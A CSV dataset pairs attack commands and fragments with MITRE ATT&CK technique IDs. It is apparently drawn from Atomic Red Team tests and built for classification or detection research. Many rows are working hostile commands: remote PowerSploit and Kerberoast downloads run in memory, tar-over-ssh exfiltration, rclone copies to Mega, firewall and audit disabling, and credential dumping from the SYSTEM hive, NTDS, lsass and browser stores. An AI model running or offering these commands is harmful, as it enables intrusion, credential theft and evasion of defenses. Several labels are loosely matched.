command,mitre_id
"$env:COR_PROFILER_PATH = '""$file_name""'",T1574
cmd /c wmic computersystem get domain,T1047
"auditctl -a always,exit -F arch=b32 -S execve -k CMDS",T1056
"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""{PATH_ABSOLUTE:folder}"" 0 1",T1218
esxcli system clock get,T1124
"path=%path%;""C:\Program Files (x86)\winzip""",T1560
ExecStartPost,T1543
"Write-Output ""Found file share: $($fileShare)""",T1619
echo Purge existing tickets and create silver ticket:,T1558
ipconfig -all,T1016
IEX(New-Object Net.WebClient).downloadString(),T1105
chmod +x $linenum,T1059
"), and socket activity (",T1562
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Gui"" -NoRestart -ErrorAction Ignore",T1562
free && echo 3 > /proc/sys/vm/drop_caches && free,T1562
"healthCheck.type = ""tcp""",T1046
"Write-Host ""Error: AADInternals could not connect""",T1484
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""",T1112
net.exe stop $service_name,T1489
Powerpnt.exe {REMOTEURL},T1105
tar czpf - /Users/* | openssl des3 -salt -pass $password | ssh $user_name@$domain 'cat > /Users.tar.gz.enc',T1048
"grep ""# THIS IS A COMMENT"" /etc/ufw/user.rules",T1562
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""",T1547
ipconfig.exe /all,T1016
"if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi;",T1069
realpath,T1562
"Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {",T1558
HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds,T1012
if ($foundFiles.Count -gt 0) {,T1005
reg save HKLM\\SYSTEM system.hiv,T1003
NTUSER.log,T1059
FONTCACHE.DAT,T1070
/var/root/.local/softwareupdate,T1543
taskkill -f -im msedge.exe,T1218
echo executing:schtasks /query /S $target.$domain,T1558
del AtomicTestT1105.js /Q >nul 2>&1,T1105
sudo touch $file_to_setuid,T1548
%ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\,T1036
~/Library/Preferences/ByHost,T1547
C:\Windows\System32\bitsadmin.exe /transfer $bits_job_name /Priority HIGH $remote_file $local_path,T1105
cat resolv.conf,T1036
DYLD_FRAMEWORK_PATH,T1574
Start-Process -FilePath $env:Temp\KeyScrambler.exe,T1574
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe,T1564
Invoke-PSRemoting,T1059
OutputDebugStringA,T1622
C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup,T1060
"Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""",T1046
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1,T1036
sc sdset,T1543
crypto pki export,T1552
SuspendThread,T1055
C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe,T1036
dsajdhas.0,T1480
libcurl.dll,T1574
.cmd,T1059
sudo chmod +x /etc/rc.common,T1037
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1547
Windows,T1485
"bash.exe -c ""{CMD}""",T1202
Write-Host $Computer},T1018
"$PathToAtomicsFolder\T1055.004\bin\x64\EarlyBird.exe -program ""$spawn_process_path"" -debug",T1055
"& ""$onedrive_path""",T1105
if ($entry.FullName.EndsWith('/')) { # directory entry,T1562
type {PATH_ABSOLUTE} > {PATH_SMB},T1048
net file,T1049
for file in $(find $file_path -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done,T1552
SystemDiskClean.ps1,T1036
wmic path win32_VideoController get VideoModeDescription,T1082
net.exe user,T1087
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""",T1547
Сhrome.Updаte.zip,T1036
dat,T1574
tar,T1560
icacls.exe,T1222
DCSync,T1003
"([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()",T1069
Dex,T1105
mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe,T1546
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List,T1518
if($reqPermission),T1098
if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > $output_file; fi;,T1083
DELETE,T1071
C:\\Users\\Public\\Libraries\\record.txt,T1074
"schtasks /Run /TN ""EventViewerBypass""",T1053
"regsvr32 /S ""C:\Program Files\Oracle\VirtualBox\VboxC.dll""",T1564
public int PrivilegeCount;,T1562
LimitLoadToSessionType,T1543
nvram,T1083
OneNote Update,T1547
tasklist.exe | findstr /i virus,T1518
swapoff -a,T1562
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f",T1562
"Start-Process ""$webbrowserpassview_path""",T1555
csc -target:library {PATH:.cs},T1127
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose,T1087
mkdir c:\exfil,T1003
Limit,T1218
IF(!(Test-Path $registryPath)),T1546
%windir%\system32\cleanmgr.exe,T1574
docker build -t t1046 $PathToAtomicsFolder/T1046/src/,T1046
bootstrap.min.css,T1070
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force",T1484
"if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo ""$HISTFILE is larger than 1k""; fi",T1562
~/Library/OpenSSL/,T1036
"Start-Process -FilePath ""C:\Windows\System32\RUNDLL32.EXE"" -ArgumentList '-sta $clsid'",T1546
C:\Users\<username>\AppData\Local\Microsoft\Outlook,T1114
wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe},T1202
"Copy-Item $profile\key4.db -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" > $null",T1555
"powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp $registry_key_storage $registry_entry_storage).$registry_entry_storage)))""",T1027
ConnectNamedPipe,T1106
"auditpol /set /category:""Account Logon"" /success:disable /failure:disable",T1562
regedit /E $path\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,T1564
companycatalog.exe.config,T1036
Start-Process -FilePath $parent_name -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $file_path -CommandLine '$command_line',T1134
IOCTL_DISK_GET_DRIVE_GEOMETRY,T1680
"Get-LocalGroupMember -Name ""Administrators""",T1069
Control_RunDLLAsUser,T1218
return $files,T1005
C:\Temp\TrustedInstaller.exe,T1036
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing),T1059
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force",T1562
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -accepteula -s %COMSPEC% /c whoami",T1078
"net.exe group ""domain admins"" /domain",T1069
", the kernel follows the bind mount and presents the benign directory’s contents instead of the malicious process's actual",T1564
$PathToAtomicsFolder\T1055\bin\x64\EtwpCreateEtwThread.exe -debug,T1055
"Write-Host ""Process Name: $processName)""",T1562
C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2>&1,T1087
sc start $service_name,T1543
bash $linenum,T1059
"Set-ItemProperty -Path $Path.PSPath -Name ""PROVIDERORDER"" -Value $UpdatedValue",T1003
http_watchdog,T1562
cd .\tmp\victim-files,T1560
powershell.exe Get-Service,T1007
pw unlock art,T1078
"Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" -Force -Recurse",T1555
if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> $output_file; fi,T1082
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll,T1546
"echo ""$encryption_password"" | gpg --batch --yes --passphrase-fd 0 --output $test_folder/$test_file.zip.gpg -c $test_folder/$test_file.zip",T1560
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\,T1547
"echo ""[Install]"" >> $path_to_systemd_service",T1053
${HOME}/.gvfsd/.profile/,T1546
"reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs"" /v Debugger /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f",T1546
telnet $host $port,T1046
change.exe user,T1218
"rundll32.exe ExampleDLL.dll, ExampleFunction",T1218
"Write-Host ""Federation successfully added to Azure AD""",T1484
garble,T1027
"& ""$sdelete_exe"" -accepteula ""$file_to_delete""",T1485
cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros),T1070
Get-GPPPassword,T1552
"Remote = ""$($_.RemoteAddress):$($_.RemotePort)""",T1049
"rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M",T1567
"explorer.exe /root,""{PATH_ABSOLUTE:.exe}""",T1202
HKCU,T1027
Software\Microsoft\Windows\CurrentVersion\Uninstall,T1012
TESTSIGNING,T1070
From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt,T1074
C:\Program Files\e Carte Bleue,T1083
klist purge,T1558
"IF EXIST ""%temp%\Windows_Defender_Cleanup.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /f )",T1562
net accounts /domain,T1201
sudo $exe_path,T1547
wmic path win32_VideoController get name,T1082
"rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}",T1218
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,T1127
"Write-Host ""executing eventvwr.msc"" -ForegroundColor Cyan",T1574
tar -xf {PATH}:ads,T1564
Import-Module ExchangeOnlineManagement,T1098
net localgroup administrator >> %temp%\download,T1069
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v fInheritInitialProgram /t REG_DWORD /d 1 /f",T1112
"cmd /c ""timeout $recording_time > NULL && psr.exe /stop""",T1113
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -EncodedCommandParamVariation $encoded_command_param_variation -Execute -ErrorAction Stop,T1059
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,T1105
"Copy-Item -Path ""$source_file"" -Destination ""$ved_path\VEDetector.exe"" -Force",T1036
auditpol /set /category:”Account Logon” /success:disable /failure:disable,T1562
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid,T1012
"xcopy /I /Y ""$web_shells"" $web_shell_path",T1505
Software\Microsoft\Windows\CurrentVersion\Internet Settings,T1012
route,T1016
dd if=/dev/random bs=1 count=1 >> $file_to_pad #adds high-quality random data,T1027
HKCU\Software\,T1112
Invoke-MalDoc -macroCode $macrocode -officeProduct $ms_product,T1204
"osascript -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to display dialog ""Software Update requires that you type your password to apply changes."" & return & return default answer """" with icon 1 with hidden answer with title ""Software Update""'",T1056
/Users/Shared/.local/kextd,T1564
net user username \password,T1136
systemctl --type=service,T1007
tasklist.exe /svc,T1007
"reg add ""HKEY_CURRENT_USER\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f",T1574
"stop-process -name ""calculator"" -Force -ErrorAction Ignore",T1218
"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt"" -officeProduct ""Word"" -sub ""ClearLogs""",T1070
ENMDSKS,T1135
~/Documents,T1486
sudo $program_path -a -f -t 3,T1040
"reg query ""HKEY_CURRENT_USER\Control Panel\International\Geo""",T1082
OpenRemoteServiceManager,T1569
"AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)""",T1218
HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated,T1012
"wscript ""$jscript""",T1059
GetModuleFileName,T1106
echo $ENCODED > $encoded_file && cat < $encoded_file | b64decode -r,T1140
HKEY_CURRENT_USER\SOFTWARE\Microsoft\WABE\DataPath,T1112
EnumFontsW(),T1106
certutil -decode hex,T1140
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing),T1558
stat,T1562
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"""" | sudo tee -a /etc/init.d/T1543.002",T1543
c:\windows\system32\provlaunch.exe LOLBin,T1218
gci -recurse,T1083
"New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableInternetFilesInPV"" -Value ""1"" -PropertyType ""Dword""",T1562
msbuild.exe {PATH:.proj},T1127
ZwProtectVirtualMemory,T1106
CreateRemoteThread,T1055
wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List,T1518
"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\"" q q",T1003
WinHTTP,T1106
dir \\$computer_ip\c$,T1135
echo '#!/bin/bash' > /tmp/art_payload.sh,T1027
SHSetValue(),T1106
net user %USER% /dom,T1087
GetLocaleInfoW,T1614
cat /etc/hosts,T1016
public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;,T1562
/etc/zlogout,T1546
"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe",T1105
"rundll32 ieadvpack.dll, RegisterOCX {CMD}",T1218
G$MSRADIUSCHAPKEY,T1556
ResumeThread,T1055
Export-AADIntADFSCertificates,T1552
Flash.exe,T1036
hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb,T1546
/usr/bin/osascript,T1059
InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.,T1218
"start-service -Name ""$service_name"" -erroraction silentlycontinue | out-null",T1543
vstest.console.exe {PATH:.dll},T1127
reg.exe add HKCU\Software\Microsoft\Office\$outlook_version\Outlook\WebView\$outlook_folder /v URL /t REG_SZ /d $url /f,T1137
{random value name} = “rundll32 shell32 ShellExec_RunDLLA REGSVR /u /s “{dropped copy path and file name}””,T1547
"curl -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 $domain",T1071
HKLM:\SOFTWARE\Microsoft\Cryptography\MachineGuid,T1012
OpenSSH,T1129
get-childitem -recurse,T1083
"Write-Host(""Cannot download $url"")",T1491
yum,T1105
cp -v /etc/pam.d/sshd /tmp/,T1056
C:\example path,T1574
"Write-Host ""Failed to enable SeDebugPrivilege."" -ForegroundColor Red",T1562
IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd ),T1546
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\ICM\Calibration,T1548
echo '#art_test_1562_006_1' >> /etc/security/$auditd_config_file_name,T1562
net.exe start >> $output_file,T1007
Remove-EventLog -LogName Security,T1070
OracleOcilib,T1012
"& ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"" -k -n $process_name",T1562
"start-process ""$env:allusersprofile\cmd.exe""",T1036
"reg.exe add ""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="" /f",T1059
RmGetList,T1057
ExitProcess,T1106
DllEntryPoint,T1218
New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription,T1098
rm -f $file_to_delete,T1070
"New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force",T1548
SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“,T1053
PrintNotify,T1543
"New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter",T1098
"Get-ChildItem ""$file_path"" | % { $_.CreationTime = ""$target_date_time"" }",T1070
ProxyServer,T1016
sh -c tail -c +1381...,T1059
"$sheet.Cells.Item(11,1) = ""=FWRITELN(A5, `""If winHttp.Status = 200 Then`"")""",T1204
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 0,T1112
quser,T1033
SYSTEM\CurrentControlSet\Control\Lsa Name,T1012
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -CommandParamVariation $command_param_variation -UseEncodedArguments -EncodedArgumentsParamVariation $encoded_arguments_param_variation -Execute -ErrorAction Stop,T1059
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe,T1546
"rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}",T1105
get-localgroupmember -group Users,T1087
Find-GPOPassword,T1552
C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.,T1218
Windows User Service,T1036
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPerServer"" /t REG_DWORD /d 10 /f",T1112
chown -R $owner:$group $file_or_folder,T1222
reset.exe session,T1218
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application,T1562
"dir ""c:\Program Files\"" >> %temp%\download",T1083
/System/Library/LaunchDaemons,T1053
find /usr/bin -perm -2000,T1548
PTASpy,T1556
C:\program files\myapp.exe,T1574
HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer,T1112
VSLaunchBrowser.exe .exe {PATH_SMB},T1127
"echo 'start_cmd=""art_test_start""' >> $rc_service_path/$rc_service_file",T1543
"Write-Output ""`nDownloaded storage account objects to $output_file""",T1619
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name,T1564
"reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f",T1547
google[.]com,T1016
"if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi",T1082
SELECT * FROM MSAcpi_ThermalZoneTemperature,T1497
region = $aws_region,T1567
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f",T1548
echo Purge existing tickets and create golden ticket:,T1558
"get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }",T1518
dir /a:h C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\,T1552
if $reboot NEQ 0 shutdown /r /t 0,T1546
pw usermod art -e +1d,T1078
.bat,T1059
%temp%\T1036.007_masquerading.xls.vbs,T1036
StubPath,T1547
"$sheet.Cells.Item(1,1).Name = ""runme""",T1204
"echo ""ExecReload=$execreload_action"" >> $systemd_service_path/$systemd_service_file",T1543
"& ""$exePath"" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id",T1003
security,T1555
ip neighbour show,T1018
sftp $username@$remote_host:$remote_path <<< $'put $local_file',T1105
